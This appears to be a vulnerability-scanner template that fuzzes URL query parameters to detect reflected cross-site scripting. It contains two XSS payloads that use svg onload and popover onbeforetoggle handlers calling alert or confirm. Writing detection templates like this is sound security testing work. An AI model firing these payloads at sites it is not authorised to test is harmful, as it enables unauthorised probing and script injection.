http:
- fuzzing:
  - fuzz:
    - '{{reflection}}'
    mode: single
    part: query
    type: postfix
  matchers:
  - part: body
    type: word
    words:
    - '{{reflection}}'
  - part: header
    type: word
    words:
    - text/html
    - application/json
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    reflection:
    - <svg onx=() onload=(confirm)(88)>
    - '"><button popovertarget=x>Click me</button><input type="hidden" value="y" popover
      id=x onbeforetoggle=alert(88)>'
  stop-at-first-match: true
id: Reflected-XSS
info:
  author: h0tak88r
  name: Basic Reflection Potential XSS Detection
  severity: medium
